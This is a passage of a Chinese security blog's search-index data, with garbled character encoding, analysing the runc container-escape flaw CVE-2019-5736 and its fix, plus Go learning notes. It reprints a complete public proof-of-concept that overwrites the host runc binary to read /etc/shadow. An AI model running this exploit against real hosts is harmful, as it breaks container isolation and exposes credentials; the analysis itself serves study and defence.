encure_cloned_binary()å‡½æ•°ä¼šå¤åˆ¶runcæ–‡ä»¶å¹¶å°†å…¶è¦†ç›–åˆ°å½“å‰è¿›ç¨‹ int ensure_cloned_binary(void) { int execfd; char **argv = NULL; /* Check that we're not self-cloned, and if we are then bail. */ int cloned = is_self_cloned(); if (cloned \u003e 0 || cloned == -ENOTRECOVERABLE) return cloned; if (fetchve(\u0026argv) \u003c 0) return -EINVAL; execfd = clone_binary(); if (execfd \u003c 0) return -EIO; if (putenv(CLONED_BINARY_ENV \"=1\")) goto error; fexecve(execfd, argv, environ); error: close(execfd); return -ENOEXEC; } ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:3:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#æ¼æ´ä¿®å¤"},{"categories":["æºç é˜…è¯»"],"content":"ä¿®è¡¥å»ºè®® åŠæ—¶å‡çº§dockerä½¿ç”¨çš„runcç‰ˆæœ¬åˆ°rc6ä»¥ä¸Š å¯¹runc initè¿›ç¨‹è¿›è¡Œç›‘æ§ï¼Œç¡®ä¿å…¶æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ä½äºå®¹å™¨å†…éƒ¨ ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:4:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#ä¿®è¡¥å»ºè®®"},{"categories":["æºç é˜…è¯»"],"content":" runc: 1.0-rc93 ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:0:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#"},{"categories":["æºç é˜…è¯»"],"content":"0x00 docker-containerd-shim è°ƒç”¨runc components/cli/cli/command/container/exec.goä¸­æ‰§è¡ŒrunExec() func runExec(dockerCli command.Cli, options execOptions) error { ... response, err := client.ContainerExecCreate(ctx, options.container, *execConfig) if err != nil { return err } execID := response.ID if execID == \"\" { return errors.New(\"exec ID empty\") } if execConfig.Detach { execStartCheck := types.ExecStartCheck{ Detach: execConfig.Detach, Tty: execConfig.Tty, } return client.ContainerExecStart(ctx, execID, execStartCheck) } return interactiveExec(ctx, dockerCli, execConfig, execID) } runExec()ä¸­è°ƒç”¨client.ContainerExecCreate()åˆ›å»ºæ‰§è¡Œç”¨æˆ·å‘½ä»¤çš„å®¹å™¨ï¼Œå¹¶è·å–IDã€‚ç„¶åå†æ ¹æ®å‘½ä»¤å‚æ•°é€‰æ‹©æ˜¯å¦è¿›è¡Œattachæ“ä½œã€‚ è¢«è°ƒç”¨çš„ContainerExecCreate()å®šä¹‰äºcomponents/engine/client/container_exec.goä¸­ã€‚è¯¥å‡½æ•°å‘æœåŠ¡ç«¯å‘å‡ºäº†è¯·æ±‚ã€‚ // ContainerExecCreate creates a new exec configuration to run an exec process. func (cli *Client) ContainerExecCreate(ctx context.Context, container string, config types.ExecConfig) (types.IDResponse, error) { var response types.IDResponse if err := cli.NewVersionError(\"1.25\", \"env\"); len(config.Env) != 0 \u0026\u0026 err != nil { return response, err } resp, err := cli.post(ctx, \"/containers/\"+container+\"/exec\", nil, config, nil) defer ensureReaderClosed(resp) if err != nil { return response, err } err = json.NewDecoder(resp.body).Decode(\u0026response) return response, err } æœåŠ¡ç«¯çš„å¯åŠ¨æµç¨‹åº”è¯¥æ˜¯è¿™æ ·çš„: components/engine/cmd/dockerd/docker.goä¸­main()å‡½æ•°è¢«æ‰§è¡Œ main()å‡½æ•°è°ƒç”¨newDaemonCommand()å‡½æ•° newDaemonCommand()å‡½æ•°è°ƒç”¨runDaemon()(components/engine/cmd/dockerd/docker_unix.go#11) func runDaemon(opts *daemonOptions) error { daemonCli := NewDaemonCli() return daemonCli.start(opts) } daemonCli.start(opts)è°ƒç”¨func (cli *DaemonCli) start()å‡½æ•°(components/engine/cmd/dockerd/daemon.go#77) æœåŠ¡ç«¯çš„åˆ†æä»start()å‡½æ•°å¼€å§‹ func (cli *DaemonCli) start(opts *daemonOptions) (err error) { ... //å®šä¹‰api cli.api = apiserver.New(serverConfig) ... //åˆ›å»ºDaemonè¿›ç¨‹ d, err := daemon.NewDaemon(ctx, cli.Config, pluginStore) if err != nil { return errors.Wrap(err, \"failed to start daemon\") } d.StoreHosts(hosts) // validate after NewDaemon has restored enabled plugins. Don't change order. if err := validateAuthzPlugins(cli.Config.AuthorizationPlugins, pluginStore); err != nil { return errors.Wrap(err, \"failed to validate authorization plugin\") } cli.d = d if err := startMetricsServer(cli.Config.MetricsAddress); err != nil { return errors.Wrap(err, \"failed to start metrics server\") } c, err := createAndStartCluster(cli, d) if err != nil { logrus.Fatalf(\"Error starting cluster component: %v\", err) } // Restart all autostart containers which has a swarm endpoint // and is not yet running now that we have successfully // initialized the cluster. d.RestartSwarmContainers() logrus.Info(\"Daemon has completed initialization\") //åˆ›å»ºè·¯ç”±ä¿¡æ¯ routerOptions, err := newRouterOptions(cli.Config, d) if err != nil { return err } routerOptions.api = cli.api routerOptions.cluster = c //åˆå§‹åŒ–è·¯ç”± initRouter(routerOptions) go d.ProcessClusterNotifications(ctx, c.GetWatchStream()) cli.setupConfigReloadTrap() // The serve API routine never exits unless an error occurs // We need to start it as a goroutine and wait on it so // daemon doesn't exit serveAPIWait := make(chan error) go cli.api.Wait(serveAPIWait) // after the daemon is done setting up we can notify systemd api notifyReady() // Daemon is fully initialized and handling API traffic // Wait for serve API to complete errAPI := \u003c-serveAPIWait c.Cleanup() //å…³é—­Daemonè¿›ç¨‹ // notify systemd that we're shutting down notifyStopping() shutdownDaemon(d) // Stop notification processing and any background processes cancel() if errAPI != nil { return errors.Wrap(errAPI, \"shutting down due to ServeAPI error\") } logrus.Info(\"Daemon shutdown complete\") return nil } å†å»çœ‹initRouter(routerOptions)å‡½æ•° func initRouter(opts routerOptions) { ... routers := []router.Router{ // we need to add the checkpoint router before the container router or the DELETE gets masked checkpointrouter.NewRouter(opts.daemon, decoder), container.NewRouter(opts.daemon, decoder, opts.daemon.Raw","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:1:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x00-docker-containerd-shim-è°ƒç”¨runc"},{"categories":["æºç é˜…è¯»"],"content":"0x01 å®¹å™¨ä¹‹å¤–çš„runcè¿›ç¨‹å¯åŠ¨ mainå‡½æ•°ä¸­åˆ›å»ºäº†æ–°çš„appå¯¹è±¡(main.go#54) func main() { app := cli.NewApp() app.Name = \"runc\" app.Usage = usage ... if err := app.Run(os.Args); err != nil { fatal(err) } } app.Run()ä¼šè°ƒç”¨run.goä¸­å®šä¹‰çš„Action(run.go#65)ï¼Œè¿›è€Œè°ƒç”¨startContainer()å‡½æ•°ã€‚ Action: func(context *cli.Context) error { if err := checkArgs(context, 1, exactArgs); err != nil { return err } if err := revisePidFile(context); err != nil { return err } spec, err := setupSpec(context) if err != nil { return err } status, err := startContainer(context, spec, CT_ACT_RUN, nil) if err == nil { // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) } return err }, startContainer()å‡½æ•°(utils_linux.go#265)åˆ›å»ºå®¹å™¨ä¿¡æ¯ï¼Œå¹¶å¯åŠ¨å®¹å™¨ func startContainer(context *cli.Context, spec *specs.Spec, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { ... //åˆ›å»ºå®¹å™¨ä¿¡æ¯ container, err := createContainer(context, id, spec) if err != nil { return -1, err } ... //åˆ›å»ºrå˜é‡ï¼Œè°ƒç”¨r.run()å¯åŠ¨å®¹å™¨ r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: true, container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, logLevel: logLevel, } return r.run(spec.Process) } å…ˆæ¥çœ‹createContainer()å‡½æ•° func createContainer(context *cli.Context, id string, spec *specs.Spec) (libcontainer.Container, error) { rootlessCg, err := shouldUseRootlessCgroupManager(context) if err != nil { return nil, err } config, err := specconv.CreateLibcontainerConfig(\u0026specconv.CreateOpts{ CgroupName: id, UseSystemdCgroup: context.GlobalBool(\"systemd-cgroup\"), NoPivotRoot: context.Bool(\"no-pivot\"), NoNewKeyring: context.Bool(\"no-new-keyring\"), Spec: spec, RootlessEUID: os.Geteuid() != 0, RootlessCgroups: rootlessCg, }) if err != nil { return nil, err } factory, err := loadFactory(context) if err != nil { return nil, err } return factory.Create(id, config) } // loadFactory returns the configured factory instance for execing containers. func loadFactory(context *cli.Context) (libcontainer.Factory, error) { ... return libcontainer.New(abs, cgroupManager, intelRdtManager, libcontainer.CriuPath(context.GlobalString(\"criu\")), libcontainer.NewuidmapPath(newuidmap), libcontainer.NewgidmapPath(newgidmap)) } // New returns a linux based container factory based in the root directory and // configures the factory with the provided option funcs. func New(root string, options ...func(*LinuxFactory) error) (Factory, error) { if root != \"\" { if err := os.MkdirAll(root, 0o700); err != nil { return nil, newGenericError(err, SystemError) } } l := \u0026LinuxFactory{ Root: root, InitPath: \"/proc/self/exe\", // è¿™é‡Œçš„ç»“æœå°± InitArgs: \"runc init\" InitArgs: []string{os.Args[0], \"init\"}, Validator: validate.New(), CriuPath: \"criu\", } Cgroupfs(l) for _, opt := range options { if opt == nil { continue } if err := opt(l); err != nil { return nil, err } } return l, nil } createContainer()å‡½æ•°çš„æ‰§è¡Œé€»è¾‘ä¸ºï¼š è°ƒç”¨loadFactory()å‡½æ•°ï¼Œè·å–LinuxFactoryç±»å‹å¯¹è±¡ è°ƒç”¨è¯¥ç±»å‹çš„Createå‡½æ•° æ‰€ä»¥æ¥åˆ†æLinuxFactoryç±»å‹çš„Create()å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶åˆ›å»ºäº†linuxContainerç±»å‹å¯¹è±¡å¹¶å°†å…¶è¿”å›ã€‚æ‰€ä»¥startContainer()å‡½æ•°ä¸­çš„containerå˜é‡ç±»å‹ä¸ºlinuxContainerï¼ˆè¿™ä¸åç»­çš„r.run()å‡½æ•°æœ‰å…³ï¼‰ã€‚ func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } ... return c, nil } r.run()å‡½æ•°(utils_linux.go#265)å¯åŠ¨å®¹å™¨ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªå…³é”®é€»è¾‘ï¼Œåˆ†åˆ«æ˜¯newProcess()å‡½æ•°ä¸r.container.Run()ã€‚ newProcess()å‡½æ•°åˆ›å»ºé€»è¾‘ä¸Šçš„å®¹å™¨è¿›ç¨‹ r.container.Run()è¿è¡Œè¯¥å®¹å™¨ åœ¨ä¹‹å‰çš„åˆ†æç»“æœä¸­ï¼Œr.containerä¸ºlinuxContainerï¼Œæ‰€ä»¥r.container.Run()è°ƒç”¨çš„æ˜¯linuxContainer.Run()æ–¹æ³•(libcontainer/container_linux.go#273)ã€‚ func (r *runner) run(config *specs.Process) (int, error) { var err error defer func()","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:2:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x01-å®¹å™¨ä¹‹å¤–çš„runcè¿›ç¨‹å¯åŠ¨"},{"categories":["æºç é˜…è¯»"],"content":"0x02 è°ƒç”¨é“¾æ¢³ç† æµç¨‹å›¾ ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:3:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x02-è°ƒç”¨é“¾æ¢³ç†"},{"categories":["æºç é˜…è¯»"],"content":"0x03 runcæ¼æ´pocåˆ†æ ä»¥https://github.com/Frichetten/CVE-2019-5736-PoCä¸ºä¾‹ package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n cat /etc/shadow \u003e /tmp/shadow \u0026\u0026 chmod 777 /tmp/shadow\" func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) \u003e 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it's executable flag for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) \u003e 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } PocåŸç†ä»‹ç» æ”¹å†™å®¹å™¨ä¸­çš„/bin/shæ–‡ä»¶ï¼Œå†™å…¥#!/proc/self/exe #!/proc/self/exeä½¿å¾—runcæ‰§è¡Œ/bin/shæ—¶ä¼šæ‰§è¡Œè‡ªèº« åœ¨å®¹å™¨ä¸­æ‰¾åˆ°runcè¿›ç¨‹çš„è¿›ç¨‹å·idï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°runcè°ƒç”¨é“¾ä¸­çš„runc initè¿›ç¨‹ï¼Œå¹¶å°è¯•å»è·å–/proc/id/exeï¼ˆå³å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶ï¼‰ã€‚è€Œrunc initæ­£åœ¨æ‰§è¡Œæ—¶ï¼Œç³»ç»Ÿæ˜¯ä¸å…è®¸å¾€runcå†™æ–‡ä»¶çš„ï¼Œå› æ­¤ä»¥è¯»çš„æ–¹å¼æ‰“å¼€ å½“runc initç»“æŸä¹‹åï¼Œå†ä»/proc/self/fdä¸­ä»¥å†™æ–¹å¼æ‰“å¼€runcçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå†™å…¥æ¶æ„ä»£ç  /procè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä»‹ç» upload_bdd41b5b3d35080460631eed73f6de7b.png\" upload_bdd41b5b3d35080460631eed73f6de7b.png ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:4:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x03-runcæ¼æ´pocåˆ†æ"},{"categories":["æºç é˜…è¯»"],"content":"0x04 ä¿®å¤ä»£ç åˆ†æ upload_0878eab4eacead51c5850593e66effdd.png\" upload_0878eab4eacead51c5850593e66effdd.png å¼•å…¥çš„ensure_cloned_binary()å‡½æ•°ä¼šåˆ›å»ºå…‹éš†çš„runcæ–‡ä»¶å¹¶æ‰§è¡Œfexecve()å‡½æ•°æ›¿æ¢å½“å‰è¿›ç¨‹æ˜ åƒ //libcontainer/nsenter/cloned_binary.c int ensure_cloned_binary(void) { int execfd; char **argv = NULL; /* Check that we're not self-cloned, and if we are then bail. */ int cloned = is_self_cloned(); if (cloned \u003e 0 || cloned == -ENOTRECOVERABLE) return cloned; if (fetchve(\u0026argv) \u003c 0) return -EINVAL; //åˆ›å»ºå…‹éš†æ–‡ä»¶ execfd = clone_binary(); if (execfd \u003c 0) return -EIO; if (putenv(CLONED_BINARY_ENV \"=1\")) goto error; fexecve(execfd, argv, environ); error: close(execfd); return -ENOEXEC; } æˆ‘ä»¬è¿˜å¯ä»¥åœ¨è¢«è°ƒç”¨çš„clone_binary()å‡½æ•°ä¸­çœ‹åˆ°å…‹éš†çš„é€»è¾‘ï¼š åˆ›å»ºæ–°çš„æ–‡ä»¶ ä»¥è¯»æ–¹å¼æ‰“å¼€/proc/self/exeï¼Œä¹Ÿå°±æ˜¯å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶ sendfile() I/Oå‡½æ•°å°†runcæ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–°çš„æ–‡ä»¶ä¸­ è¿”å›æ–°çš„æ–‡ä»¶æè¿°ç¬¦ static int clone_binary(void) { int binfd, execfd; struct stat statbuf = { }; size_t sent = 0; int fdtype = EFD_NONE; /* * Before we resort to copying, let's try creating an ro-binfd in one shot * by getting a handle for a read-only bind-mount of the execfd. */ execfd = try_bindfd(); if (execfd \u003e= 0) return execfd; /* * Dammit, that didn't work -- time to copy the binary to a safe place we * can seal the contents. */ // åˆ›å»ºç©ºçš„å…‹éš†æ–‡ä»¶ï¼Œå¾…å†™å…¥ execfd = make_execfd(\u0026fdtype); if (execfd \u003c 0 || fdtype == EFD_NONE) return -ENOTRECOVERABLE; // è¿™é‡Œçš„åº”è¯¥æ˜¯åŸæœ¬çš„runc binfd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC); if (binfd \u003c 0) goto error; if (fstat(binfd, \u0026statbuf) \u003c 0) goto error_binfd; //å†™å…¥å†…å®¹ while (sent \u003c statbuf.st_size) { int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent); if (n \u003c 0) { /* sendfile can fail so we fallback to a dumb user-space copy. */ n = fd_to_fd(execfd, binfd); if (n \u003c 0) goto error_binfd; } sent += n; } close(binfd); if (sent != statbuf.st_size) goto error; if (seal_execfd(\u0026execfd, fdtype) \u003c 0) goto error; return execfd; error_binfd: close(binfd); error: close(execfd); return -EIO; } ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:5:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x04-ä¿®å¤ä»£ç åˆ†æ"},{"categories":["æºç é˜…è¯»"],"content":"å‚è€ƒé“¾æ¥ runcæºç åˆ†æ(ä¸€)-createå’Œstartæµç¨‹-v1.0.0-rc2 runc å¯åŠ¨å®¹å™¨è¿‡ç¨‹åˆ†æï¼ˆé™„ CVE-2019-5736 å®ç°è¿‡ç¨‹ï¼‰ CVE-2019-5736å¤ç°åŠåˆ†æ CVE-2019-5736 patch ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:6:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#å‚è€ƒé“¾æ¥"},{"categories":["è¯­è¨€å­¦ä¹ ç¬”è®°"],"content":"Goçš„packageç®¡ç†ä¸GOPATHä¸go modules å…³äºGOPATHçš„ä½œç”¨ http://c.biancheng.net/view/88.html å…³äºgo 1.11ä¹‹åå¼•å…¥çš„go mudulesæœºåˆ¶ https://geektutu.com/post/quick-golang.html#9-%E5%8C%85-Package-%E5%92%8C%E6%A8%A1%E5%9D%97-Modules ä¸Šè¿°ä¸¤ä¸ªé“¾æ¥ä¸­çš„å†…å®¹è®²å¾—è¿˜ä¸é”™ã€‚çœ‹ä¸€éä¸‹æ¥ï¼Œæ„Ÿè§‰GOPATHå°±æ˜¯è¿‡å»çš„goç”¨æ¥ç®¡ç†ç»„ç»‡é¡¹ç›®çš„ä¸åŒåŒ…çš„æ–¹å¼ï¼Œè€Œgo modulesæ˜¯æ–°çš„ç®¡ç†åŒ…çš„æ–¹å¼ã€‚åœ¨ä¸€ä¸ªç›®å½•ä¸‹æ‰§è¡Œgo mod init packagenameä¹‹åï¼Œå°±å¯ä»¥æ–¹ä¾¿åœ°å¼•ç”¨è¯¥ç›®å½•ä¸‹çš„åŒ…ã€‚ ","date":"2021-04-05","objectID":"/2021-04-05-golang-notes/:1:0","series":null,"tags":["Golang"],"title":"Golang notes","uri":"/2021-04-05-golang-notes/#goçš„packageç®¡ç†ä¸gopathä¸go-modules"},{"categories":["è¯­è¨€å­¦ä¹ ç¬”è®°"],"content":"Goçš„interfaceå­¦ä¹  é¦–å…ˆç»™å‡ºinterfaceçš„å®šä¹‰è¯­æ³•ï¼š type inter1 interface { func1(x int)(int, error) } interfaceæ˜¯ä¸€ç§æŠ½è±¡çš„ç±»å‹ï¼Œå¯ä»¥çœ‹ä½œå¯¹ä¸€ç§è§„èŒƒçš„å®šä¹‰ã€‚æ¥å£å®šä¹‰çš„å‡½æ•°å°±æ˜¯æ»¡è¶³è¿™ç§è§„èŒƒçš„å…·ä½“ç±»å‹æ‰€éœ€è¦å®ç°çš„æ–¹æ³•ã€‚ æ¥å£ä¸€èˆ¬è¢«ç”¨åœ¨å‡½æ•°å‚æ•°é‡Œï¼Œæä¾›ä¸€ç§æŠ½è±¡çš„å‡½æ•°å¯¹æ¥ æ¯”å¦‚ï¼Œä¸€ä¸ªå‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š func userFunction(i inter1)(int error){ ... } é‚£ä¹ˆå¯¹äºå®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»å‹ï¼Œå¦‚ï¼š type s1 struct { ... } func (s s1) func1(x int) (int, error) { ... } æˆ‘ä»¬å°±èƒ½å¤Ÿå°†s1ç±»å‹çš„å˜é‡ä½œä¸ºå‚æ•°ä¼ å…¥userFunction()ä¸­ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€ç§æ¥å£çš„æ‰€æœ‰æ–¹æ³•è¢«ä¸€ç§å…·ä½“ç±»å‹æ‰€å®ç°ï¼Œæ‰èƒ½è¯´è¿™ç§ç±»å‹å®ç°äº†è¿™ä¸ªæ¥å£ æµ‹è¯•ä»£ç  package main import \"fmt\" type pVal struct { val int } func (p pVal) fun() (int, error) { if p.val \u003e 0 { return p.val, nil } else { return -1, fmt.Errorf(\"p.val å°äº0: %d\", p.val) } } //æ¥å£å®šä¹‰äº†ä¸€ç§è§„èŒƒã€çº¦å®š type testInter interface { fun() (int, error) fun2() (int, error) } func userFunction(s testInter) int { res, err := s.fun() //error handle if err != nil { fmt.Println(err) return -1 } return res } func main() { v1 := pVal{-1} fmt.Printf(\"type: %T\\n\", v1) res := userFunction(v1) fmt.Println(res) //æ¥å£çš„ç¬¬äºŒç§ç”¨æ³• var interVal testInter interVal = v1 interVal.fun() } ","date":"2021-04-05","objectID":"/2021-04-05-golang-notes/:2:0","series":null,"tags":["Golang"],"title":"Golang notes","uri":"/2021-04-05-golang-notes/#goçš„interfaceå­¦ä¹ "},{"categories":["è¯­è¨€å­¦ä¹ ç¬”è®°"],"content":"Goçš„interfaceå­¦ä¹  é¦–å…ˆç»™å‡ºinterfaceçš„å®šä¹‰è¯­æ³•ï¼š type inter1 interface { func1(x int)(int, error) } interfaceæ˜¯ä¸€ç§æŠ½è±¡çš„ç±»å‹ï¼Œå¯ä»¥çœ‹ä½œå¯¹ä¸€ç§è§„èŒƒçš„å®šä¹‰ã€‚æ¥å£å®šä¹‰çš„å‡½æ•°å°±æ˜¯æ»¡è¶³è¿™ç§è§„èŒƒçš„å…·ä½“ç±»å‹æ‰€éœ€è¦å®ç°çš„æ–¹æ³•ã€‚ æ¥å£ä¸€èˆ¬è¢«ç”¨åœ¨å‡½æ•°å‚æ•°é‡Œï¼Œæä¾›ä¸€ç§æŠ½è±¡çš„å‡½æ•°å¯¹æ¥ æ¯”å¦‚ï¼Œä¸€ä¸ªå‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š func userFunction(i inter1)(int error){ ... } é‚£ä¹ˆå¯¹äºå®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»å‹ï¼Œå¦‚ï¼š type s1 struct { ... } func (s s1) func1(x int) (int, error) { ... } æˆ‘ä»¬å°±èƒ½å¤Ÿå°†s1ç±»å‹çš„å˜é‡ä½œä¸ºå‚æ•°ä¼ å…¥userFunction()ä¸­ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€ç§æ¥å£çš„æ‰€æœ‰æ–¹æ³•è¢«ä¸€ç§å…·ä½“ç±»å‹æ‰€å®ç°ï¼Œæ‰èƒ½è¯´è¿™ç§ç±»å‹å®ç°äº†è¿™ä¸ªæ¥å£ æµ‹è¯•ä»£ç  package main import \"fmt\" type pVal struct { val int } func (p pVal) fun() (int, error) { if p.val 0 { return p.val, nil } else { return -1, fmt.Errorf(\"p.val å°äº0: %d\", p.val) } } //æ¥å£å®šä¹‰äº†ä¸€ç§è§„èŒƒã€çº¦å®š type testInter interface { fun() (int, error) fun2() (int, error) } func userFunction(s testInter) int { res, err := s.fun() //error handle if err != nil { fmt.Println(err) return -1 } return res } func main() { v1 := pVal{-1} fmt.Printf(\"type: %T\\n\", v1) res := userFunction(v1) fmt.Println(res) 